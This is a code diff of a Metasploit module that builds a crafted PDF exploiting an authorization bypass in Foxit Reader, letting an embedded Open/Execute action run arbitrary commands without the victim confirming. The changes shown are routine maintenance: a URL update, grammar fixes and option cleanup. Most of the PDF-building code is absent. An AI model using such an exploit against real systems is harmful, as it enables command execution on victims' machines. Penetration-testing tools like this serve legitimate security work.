@@ -1,22 +1,20 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'zlib'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::FILEFORMAT
 
   def initialize(info = {})
     super(update_info(info,
       'Name'           => 'Foxit Reader Authorization Bypass',
       'Description'    => %q{
-          This module exploits a authorization bypass vulnerability in Foxit Reader
-        build 1120. When a attacker creates a specially crafted pdf file containing
-        a Open/Execute action, arbitrary commands can be executed without confirmation
+          This module exploits an authorization bypass vulnerability in Foxit Reader
+        build 1120. When an attacker creates a specially crafted pdf file containing
+        an Open/Execute action, arbitrary commands can be executed without confirmation
         from the victim.
       },
       'License'        => MSF_LICENSE,
@@ -33,9 +31,8 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         OptString.new('CMD',        [ false, 'The command to execute.', '/C/Windows/System32/calc.exe']),
-        OptString.new('FILENAME',   [ false, 'The file name.',  'msf.pdf']),
-        OptString.new('OUTPUTPATH', [ false, 'The location of the file.',  './data/exploits/']),
-      ], self.class)
+        OptString.new('FILENAME',   [ false, 'The file name.',  'msf.pdf'])
+      ])
 
   end
 
@@ -113,5 +110,4 @@ class MetasploitModule < Msf::Auxiliary
     pdf << "%%EOF" << eol
 
   end
-
 end
